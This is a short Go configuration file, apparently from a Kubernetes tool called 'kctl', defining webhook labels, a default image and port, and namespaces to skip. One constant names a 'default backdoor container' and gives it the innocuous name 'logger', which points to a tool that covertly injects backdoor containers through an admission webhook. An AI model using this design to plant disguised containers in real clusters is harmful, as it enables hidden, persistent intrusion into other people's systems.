package config

// ==================== Webhook 配置 ====================

const (
	// WebhookManagedByLabel 标识 Webhook 由 kctl 管理的 label key
	WebhookManagedByLabel = "app.kubernetes.io/managed-by"

	// WebhookManagedByValue 标识 Webhook 由 kctl 管理的 label value
	WebhookManagedByValue = "kctl"

	// WebhookComponentLabel 组件标签
	WebhookComponentLabel = "app.kubernetes.io/component"

	// WebhookNameLabel 名称标签
	WebhookNameLabel = "app.kubernetes.io/name"

	// DefaultWebhookImage Webhook 服务默认镜像 (Go 二进制，约 6MB)
	DefaultWebhookImage = "ghcr.io/kctl/webhook:latest"

	// DefaultWebhookPort Webhook 服务默认端口
	DefaultWebhookPort int32 = 443

	// DefaultWebhookNamePrefix Webhook 名称前缀
	DefaultWebhookNamePrefix = "kctl-webhook"

	// DefaultBackdoorContainerName 默认后门容器名称
	DefaultBackdoorContainerName = "logger"
)

// DefaultExcludeNamespaces 默认排除的命名空间 (避免破坏集群)
var DefaultExcludeNamespaces = []string{
	"kube-system",
	"kube-public",
	"kube-node-lease",
}
